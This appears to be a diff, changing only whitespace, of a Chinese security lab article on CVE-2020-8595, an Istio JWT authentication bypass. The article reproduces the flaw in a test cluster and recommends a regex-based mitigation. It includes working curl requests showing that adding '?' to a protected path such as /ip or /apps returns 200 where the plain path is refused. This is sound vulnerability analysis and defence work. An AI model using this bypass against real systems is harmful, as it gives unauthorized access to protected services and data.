@@ -21,13 +21,13 @@ JWT的原理也较好理解，服务器认证之后会返回一个json对象并�
   
 Istio架构中的JWT认证主要依赖于JWKS（JSON Web Key Set）， JWKS是一组密钥集合，其中包含用于验证JWT的公钥，在Istio中JWT认证策略通常通过配置一个.yaml文件实现，为了便于理解，以下是一个简单的jwt认证策略配置[3]：  
 ```
-1issuer: https://example.com
-2jwksUri: https://example.com/.well-known/jwks.json
+1issuer: https://example.com
+2jwksUri: https://example.com/.well-known/jwks.json
 3triggerRules:
-4- excludedPaths:
-5  - exact: /status/version
-6  includedPaths:
-7  - prefix: /status/
+4- excludedPaths:
+5  - exact: /status/version
+6  includedPaths:
+7  - prefix: /status/
 
 ```  
   
@@ -50,7 +50,7 @@ triggerRules（重要）：此参数意思为Istio使用JWT验证请求的触发
   
 关于CVE-2020-8595漏洞，Istio的官方声明为[6]:  
   
-A bug in Istio’s Authentication Policy exact path matching logic allows unauthorized access to resources without a valid JWT token. This bug affects all versions of Istio that support JWT Authentication Policy with path based triggerRules. The logic for the exact path match in the Istio JWT filter includes query strings or fragments instead of stripping them off before matching. This means attackers can bypass the JWT validation by appending ? or # characters after the protected paths.  
+A bug in Istio’s Authentication Policy exact path matching logic allows unauthorized access to resources without a valid JWT token. This bug affects all versions of Istio that support JWT Authentication Policy with path based triggerRules. The logic for the exact path match in the Istio JWT filter includes query strings or fragments instead of stripping them off before matching. This means attackers can bypass the JWT validation by appending ? or # characters after the protected paths.  
   
 我们可以看到问题出现在Istio JWT策略配置中的triggerRules机制，triggerRules包含请求url的字符串匹配机制， 主要有以下四种：  
   
@@ -68,21 +68,21 @@ triggerRules中exact匹配的内容应当“/over/there?name=ferret#nose”，�
   
 指定JWT保护路径的原始认证策略如下：  
 ```
-1apiVersion: "authentication.istio.io/v1alpha1"
- 2kind: "Policy"
+1apiVersion: "authentication.istio.io/v1alpha1"
+ 2kind: "Policy"
  3metadata:
- 4  name: "jwt-example"
- 5  namespace: istio-system
+ 4  name: "jwt-example"
+ 5  namespace: istio-system
  6spec:
- 7  targets:
- 8  - name: istio-ingressgateway #需要在istio网关入口处部署JWT认证策略
- 9  origins:
-10  - jwt:
-11      issuer: "testing@secure.istio.io" #JWT颁发者
-12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" #用于验证JWT的JWKS所在URL
-13      trigger_rules: #JWT验证请求的触发规则列表
-14      - included_paths: #代表只有访问包含以下路径规则才需要JWT认证
-15        - exact: /productpage #满足路径与productpage完全匹配后，才可以访问productpage服务（需要JWT认证，没有有效JWT无法访问）
+ 7  targets:
+ 8  - name: istio-ingressgateway #需要在istio网关入口处部署JWT认证策略
+ 9  origins:
+10  - jwt:
+11      issuer: "testing@secure.istio.io" #JWT颁发者
+12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" #用于验证JWT的JWKS所在URL
+13      trigger_rules: #JWT验证请求的触发规则列表
+14      - included_paths: #代表只有访问包含以下路径规则才需要JWT认证
+15        - exact: /productpage #满足路径与productpage完全匹配后，才可以访问productpage服务（需要JWT认证，没有有效JWT无法访问）
 
 ```  
   
@@ -100,7 +100,7 @@ Istio版本：v1.4.2
   
 Kubernetes版本：v1.16.2  
   
-集群主机：node1（Master）/node2 (Slave)   
+集群主机：node1（Master）/node2 (Slave)   
   
 操作系统：Ubuntu 18.04  
   
@@ -108,7 +108,7 @@ Kubernetes版本：v1.16.2
   
 **4.2.1创建foo命名空间**  
 ```
-1kubectl create ns foo
+1kubectl create ns foo
 
 ```  
   
@@ -116,29 +116,29 @@ Kubernetes版本：v1.16.2
   
 httpbin.yaml 在istio/istio-1.4.2/samples/httpbin路径下[5]  
 ```
-1kubectl apply -f <(istioctl kube-inject -f httpbin.yaml) -n foo
+1kubectl apply -f <(istioctl kube-inject -f httpbin.yaml) -n foo
 
 ```  
   
 **4.2.3创建httpbin gateway**  
 ```
- 1#创建httpbin gateway
- 2kubectl apply -f - <<EOF
- 3apiVersion: networking.istio.io/v1alpha3
- 4kind: Gateway
+ 1#创建httpbin gateway
+ 2kubectl apply -f - <<EOF
+ 3apiVersion: networking.istio.io/v1alpha3
+ 4kind: Gateway
  5metadata:
- 6  name: httpbin-gateway
- 7  namespace: foo
+ 6  name: httpbin-gateway
+ 7  namespace: foo
  8spec:
- 9  selector:
-10    istio: ingressgateway # use Istio default gateway implementation
-11  servers:
-12  - port:
-13      number: 80
-14      name: http
-15      protocol: HTTP
-16    hosts:
-17    - "*"
+ 9  selector:
+10    istio: ingressgateway # use Istio default gateway implementation
+11  servers:
+12  - port:
+13      number: 80
+14      name: http
+15      protocol: HTTP
+16    hosts:
+17    - "*"
 18EOF
 
 ```  
@@ -147,52 +147,52 @@ httpbin.yaml 在istio/istio-1.4.2/samples/httpbin路径下[5]
   
 通过ingress gateway将httpbin服务暴露在外部可访问  
 ```
- 1kubectl apply -f - <<EOF
- 2apiVersion: networking.istio.io/v1alpha3
- 3kind: VirtualService
+ 1kubectl apply -f - <<EOF
+ 2apiVersion: networking.istio.io/v1alpha3
+ 3kind: VirtualService
  4metadata:
- 5  name: httpbin
- 6  namespace: foo
+ 5  name: httpbin
+ 6  namespace: foo
  7spec:
- 8  hosts:
- 9  - "*"
-10  gateways:
-11  - httpbin-gateway
-12  http:
-13  - route:
-14    - destination:
-15        port:
-16          number: 8000
-17        host: httpbin.foo.svc.cluster.local
+ 8  hosts:
+ 9  - "*"
+10  gateways:
+11  - httpbin-gateway
+12  http:
+13  - route:
+14    - destination:
+15        port:
+16          number: 8000
+17        host: httpbin.foo.svc.cluster.local
 18EOF
 
 ```  
   
 **4.2.5对httpbin服务部署JWT策略**  
 ```
- 1cat <<EOF | kubectl apply -n foo -f -
- 2apiVersion: "authentication.istio.io/v1alpha1"
- 3kind: "Policy"
+ 1cat <<EOF | kubectl apply -n foo -f -
+ 2apiVersion: "authentication.istio.io/v1alpha1"
+ 3kind: "Policy"
  4metadata:
- 5  name: "jwt-example"
+ 5  name: "jwt-example"
  6spec:
- 7  targets:
- 8  - name: httpbin
- 9  origins:
-10  - jwt:
-11      issuer: "testing@secure.istio.io"
-12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
-13      trigger_rules:
-14      - included_paths:
-15        - exact: /ip
-16  principalBinding: USE_ORIGIN
+ 7  targets:
+ 8  - name: httpbin
+ 9  origins:
+10  - jwt:
+11      issuer: "testing@secure.istio.io"
+12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
+13      trigger_rules:
+14      - included_paths:
+15        - exact: /ip
+16  principalBinding: USE_ORIGIN
 17EOF
 
 ```  
   
 **4.2.6设定环境变量**  
 ```
-1export INGRESS_HOST=http://192.168.19.11:31380
+1export INGRESS_HOST=http://192.168.19.11:31380
 ```  
   
   
@@ -200,70 +200,70 @@ httpbin.yaml 在istio/istio-1.4.2/samples/httpbin路径下[5]
   
 首先我们先访问一个未加JWT认证的url path“/user-agent”  
 ```
- 1root@node2:~# curl -v $INGRESS_HOST/user-agent
- 2* Trying 192.168.19.11...
- 3* TCP_NODELAY set
- 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 5> GET /user-agent HTTP/1.1
- 6> Host: 192.168.19.11:31380
- 7> User-Agent: curl/7.58.0
- 8> Accept: */*
+ 1root@node2:~# curl -v $INGRESS_HOST/user-agent
+ 2* Trying 192.168.19.11...
+ 3* TCP_NODELAY set
+ 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 5> GET /user-agent HTTP/1.1
+ 6> Host: 192.168.19.11:31380
+ 7> User-Agent: curl/7.58.0
+ 8> Accept: */*
  9>
-10< HTTP/1.1 200 OK
-11< server: istio-envoy
-12< date: Thu， 05 Mar 2020 06:47:22 GMT
-13< content-type: application/json
-14< content-length: 34
-15< access-control-allow-origin: *
-16< access-control-allow-credentials: true
-17< x-envoy-upstream-service-time: 7
+10< HTTP/1.1 200 OK
+11< server: istio-envoy
+12< date: Thu， 05 Mar 2020 06:47:22 GMT
+13< content-type: application/json
+14< content-length: 34
+15< access-control-allow-origin: *
+16< access-control-allow-credentials: true
+17< x-envoy-upstream-service-time: 7
 18<
 19{
-20"user-agent": "curl/7.58.0"
+20"user-agent": "curl/7.58.0"
 21}
 
 ```  
   
 可以看到返回200状态码，访问成功！接着再访问加了JWT认证的url path "/ip":  
 ```
- 1Origin authentication failed.root@node2:~# curl -v $INGRESS_HOST/ip
- 2* Trying 192.168.19.11...
- 3* TCP_NODELAY set
- 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 5> GET /ip HTTP/1.1
- 6> Host: 192.168.19.11:31380
- 7> User-Agent: curl/7.58.0
- 8> Accept: */*
- 9>10< HTTP/1.1 401 Unauthorized
-11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 06:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
+ 1Origin authentication failed.root@node2:~# curl -v $INGRESS_HOST/ip
+ 2* Trying 192.168.19.11...
+ 3* TCP_NODELAY set
+ 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 5> GET /ip HTTP/1.1
+ 6> Host: 192.168.19.11:31380
+ 7> User-Agent: curl/7.58.0
+ 8> Accept: */*
+ 9>10< HTTP/1.1 401 Unauthorized
+11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 06:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
 
 ```  
   
 可以看到服务端返回401 Unauthorized拒绝访问，原因是需要认证授权，证明策略生效了。我们再访问JWT认证下的path + query(通过添加”?“符号)  
 ```
-1root@node2:~# curl -v $INGRESS_HOST/ip?a=1
+1root@node2:~# curl -v $INGRESS_HOST/ip?a=1
 
 ```  
 ```
- 1* Trying 192.168.19.11...
- 2* TCP_NODELAY set
- 3* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 4> GET /ip?a=1 HTTP/1.1
- 5> Host: 192.168.19.11:31380
- 6> User-Agent: curl/7.58.0
- 7> Accept: */*
+ 1* Trying 192.168.19.11...
+ 2* TCP_NODELAY set
+ 3* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 4> GET /ip?a=1 HTTP/1.1
+ 5> Host: 192.168.19.11:31380
+ 6> User-Agent: curl/7.58.0
+ 7> Accept: */*
  8>
- 9< HTTP/1.1 200 OK
-10< server: istio-envoy
-11< date: Thu， 05 Mar 2020 06:53:00 GMT
-12< content-type: application/json
-13< content-length: 29
-14< access-control-allow-origin: *
-15< access-control-allow-credentials: true
-16< x-envoy-upstream-service-time: 5
+ 9< HTTP/1.1 200 OK
+10< server: istio-envoy
+11< date: Thu， 05 Mar 2020 06:53:00 GMT
+12< content-type: application/json
+13< content-length: 29
+14< access-control-allow-origin: *
+15< access-control-allow-credentials: true
+16< x-envoy-upstream-service-time: 5
 17<
 18{
-19"origin": "10.244.0.0"
+19"origin": "10.244.0.0"
 20}
 ```  
   
@@ -279,9 +279,9 @@ https://gist.githubusercontent.com/nrjpoddar/62114128d12478abe8366404bf547b77/ra
   
 实验结果如下：  
 ```
-1root@node2:/home/puming/test# ./test_istio_jwt_cve.sh  istio/proxyv2:1.4.2
-2/home/puming/test/cve-2020-8595.VzW0Mi /home/puming/test
-3./test_istio_jwt_cve.sh: line 260: warning: here-document at line 148 delimited by end-of-file (wanted `EOF')4Sleeping for 5 seconds so the docker container is up and running5[CVE-2020-8595] Vulnerable63d74c863fdb819f2bcabb8334b1e8f4fdd56c9d0908918ef4f900131fb21c8147/home/puming/test8
+1root@node2:/home/puming/test# ./test_istio_jwt_cve.sh  istio/proxyv2:1.4.2
+2/home/puming/test/cve-2020-8595.VzW0Mi /home/puming/test
+3./test_istio_jwt_cve.sh: line 260: warning: here-document at line 148 delimited by end-of-file (wanted `EOF')4Sleeping for 5 seconds so the docker container is up and running5[CVE-2020-8595] Vulnerable63d74c863fdb819f2bcabb8334b1e8f4fdd56c9d0908918ef4f900131fb21c8147/home/puming/test8
 
 ```  
   
@@ -303,53 +303,53 @@ curl -v $INGRESS_HOST/apps?manifest=com.mozilla.mozdef 可以将漏洞信息还�
   
 通过图3的红框部分可以看出，该网站的app详细信息接口由于未授权访问漏洞暴露了app的敏感信息，例如端口号、操作系统版本、用户名密码等。对于网站开发人员来说，可能并不知此漏洞的存在，于是潜在的危险出现了，以下将还原整个过程，首先将此应用部署至Istio，通过下发JWT策略对”/apps”进行身份认证，配置如下：  
 ```
- 1cat <<EOF | kubectl apply -n foo -f -
- 2apiVersion: "authentication.istio.io/v1alpha1"
- 3kind: "Policy"
+ 1cat <<EOF | kubectl apply -n foo -f -
+ 2apiVersion: "authentication.istio.io/v1alpha1"
+ 3kind: "Policy"
  4metadata:
- 5  name: "jwt " 
+ 5  name: "jwt " 
  6spec:
- 7  targets:
- 8  - name:  web-test
- 9  origins:
-10  - jwt:
-11      issuer: "testing@secure.istio.io"
-12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
-13      trigger_rules:
-14      - included_paths:
-15        - exact: /apps
-16  principalBinding: USE_ORIGIN
+ 7  targets:
+ 8  - name:  web-test
+ 9  origins:
+10  - jwt:
+11      issuer: "testing@secure.istio.io"
+12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
+13      trigger_rules:
+14      - included_paths:
+15        - exact: /apps
+16  principalBinding: USE_ORIGIN
 17EOF
 
 ```  
   
 配置成功后进行访问，可以看到访问失败，证明JWT策略生效了，如下所示：  
 ```
- 1root@node2:~# curl -v $INGRESS_HOST/apps/
- 2* Trying 192.168.19.11...
- 3* TCP_NODELAY set
- 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 5> GET /apps/ HTTP/1.1
- 6> Host: 192.168.19.11:31380
- 7> User-Agent: curl/7.58.0
- 8> Accept: */*
- 9>10< HTTP/1.1 401 Unauthorized
-11< content-length: 2912< content-type: text/plain13< date: Thu， 07 Mar 2020 04:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
+ 1root@node2:~# curl -v $INGRESS_HOST/apps/
+ 2* Trying 192.168.19.11...
+ 3* TCP_NODELAY set
+ 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 5> GET /apps/ HTTP/1.1
+ 6> Host: 192.168.19.11:31380
+ 7> User-Agent: curl/7.58.0
+ 8> Accept: */*
+ 9>10< HTTP/1.1 401 Unauthorized
+11< content-length: 2912< content-type: text/plain13< date: Thu， 07 Mar 2020 04:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
 
 ```  
   
 以攻击者视角尝试访问”/apps?”：  
 ```
- 1root@node2:~# curl -v $INGRESS_HOST/apps?
- 2* Trying 192.168.19.11...
- 3* TCP_NODELAY set
- 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 5> GET /apps? HTTP/1.1
- 6> Host: 192.168.19.11:31380
- 7> User-Agent: curl/7.58.0
- 8> Accept: */*
- 9>10< HTTP/1.1 200 OK
-11< server: istio-envoy12< date: Thu， 07 Mar 2020 04:53:00 GMT13< content-type: application/json14< content-length: 2915< access-control-allow-origin: *16< access-control-allow-credentials: true17< x-envoy-upstream-service-time: 518<19
+ 1root@node2:~# curl -v $INGRESS_HOST/apps?
+ 2* Trying 192.168.19.11...
+ 3* TCP_NODELAY set
+ 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 5> GET /apps? HTTP/1.1
+ 6> Host: 192.168.19.11:31380
+ 7> User-Agent: curl/7.58.0
+ 8> Accept: */*
+ 9>10< HTTP/1.1 200 OK
+11< server: istio-envoy12< date: Thu， 07 Mar 2020 04:53:00 GMT13< content-type: application/json14< content-length: 2915< access-control-allow-origin: *16< access-control-allow-credentials: true17< x-envoy-upstream-service-time: 518<19
 ```  
   
 可以成功访问，证明了Istio的未授权访问漏洞确实存在，于是攻击者可以完美绕过JWT认证并且成功利用到程序自身的漏洞，进而访问到每个app的敏感信息，一旦攻击者拥有这些敏感信息例如用户名密码，便可直接对网站上的app进行访问，植入后门，后果不堪设想。  
@@ -362,54 +362,54 @@ curl -v $INGRESS_HOST/apps?manifest=com.mozilla.mozdef 可以将漏洞信息还�
 - 通过添加正则临时缓解  
   
 ```
-1- jwt:
-2    issuer: "testing@secure.istio.io"
-3    jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" 
-4    trigger_rules:
-5    - included_paths:
-6      - regex: '/productpage(\?.*)?' #
-7      - regex: '/productpage(#.*)?'  #
+1- jwt:
+2    issuer: "testing@secure.istio.io"
+3    jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" 
+4    trigger_rules:
+5    - included_paths:
+6      - regex: '/productpage(\?.*)?' #
+7      - regex: '/productpage(#.*)?'  #
 
 ```  
   
 此正则表达式满足 path + query + fragment 完全匹配，我们可以简单实验下可行性：给exact路径添加正则匹配前先将之前的策略删除  
 ```
- 1root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# kubectl delete policy.authentication.istio.io jwt-example -n foo
- 2policy.authentication.istio.io "jwt-example" deleted
- 3root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# cat <<EOF | kubectl apply -n foo -f -
- 4> apiVersion: "authentication.istio.io/v1alpha1"
- 5> kind: "Policy"
- 6> metadata:
- 7>   name: "jwt-example"
- 8> spec:
- 9>   targets:
-10>   - name: httpbin
-11>   origins:
-12>   - jwt:
-13>       issuer: "testing@secure.istio.io"
-14>       jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
-15>       trigger_rules:
-16>       - included_paths:
-17>         - regex: '/ip(\?.*)?'
-18>         - regex: '/ip(#.*)?'
-19>   principalBinding: USE_ORIGIN
-20> EOF
-21policy.authentication.istio.io/jwt-example created
+ 1root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# kubectl delete policy.authentication.istio.io jwt-example -n foo
+ 2policy.authentication.istio.io "jwt-example" deleted
+ 3root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# cat <<EOF | kubectl apply -n foo -f -
+ 4> apiVersion: "authentication.istio.io/v1alpha1"
+ 5> kind: "Policy"
+ 6> metadata:
+ 7>   name: "jwt-example"
+ 8> spec:
+ 9>   targets:
+10>   - name: httpbin
+11>   origins:
+12>   - jwt:
+13>       issuer: "testing@secure.istio.io"
+14>       jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
+15>       trigger_rules:
+16>       - included_paths:
+17>         - regex: '/ip(\?.*)?'
+18>         - regex: '/ip(#.*)?'
+19>   principalBinding: USE_ORIGIN
+20> EOF
+21policy.authentication.istio.io/jwt-example created
 
 ```  
   
 再访问ip的完整URL，如下所示，可以看到服务端返回401 Unauthorized拒绝访问，说明正则匹配生效，'/ip(#.*)?'同理，不作赘述  
 ```
- 1root@node2:~# curl -v $INGRESS_HOST/ip?a=1
- 2*   Trying 192.168.19.11...
- 3* TCP_NODELAY set
- 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
- 5> GET /ip?a=1 HTTP/1.1
- 6> Host: 192.168.19.11:31380
- 7> User-Agent: curl/7.58.0
- 8> Accept: */*
- 9>10< HTTP/1.1 401 Unauthorized
-11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 07:02:58 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
+ 1root@node2:~# curl -v $INGRESS_HOST/ip?a=1
+ 2*   Trying 192.168.19.11...
+ 3* TCP_NODELAY set
+ 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
+ 5> GET /ip?a=1 HTTP/1.1
+ 6> Host: 192.168.19.11:31380
+ 7> User-Agent: curl/7.58.0
+ 8> Accept: */*
+ 9>10< HTTP/1.1 401 Unauthorized
+11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 07:02:58 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016
 
 ```  
   
@@ -432,7 +432,7 @@ CVE-2020-8595漏洞让Istio的安全管理机制脆弱性得以暴露，那么JW
   
 [2].  
 http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html  
-    
+    
   
 [3].  
 https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/#Jwt  
@@ -475,8 +475,8 @@ https://istio.io/news/security
 添加好友，备注“**进群**”，加入容器安全技术交流群，通过后会拉您入群。  
   
 内容编辑：星云实验室 浦明  
-    
- 责任编辑：肖晴  
+    
+ 责任编辑：肖晴  
   
 **往****期回顾**  
 - [【云原生技术研究】BPF使能软件定义内核](http://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247487440&idx=1&sn=cb6379cfc4a1bba0881363840afc438a&chksm=e84fa90fdf38201990781e3c95d9857e6d4ad083ce40a575e1cbdc12aaabb4f58ba527dc58c1&scene=21#wechat_redirect)  
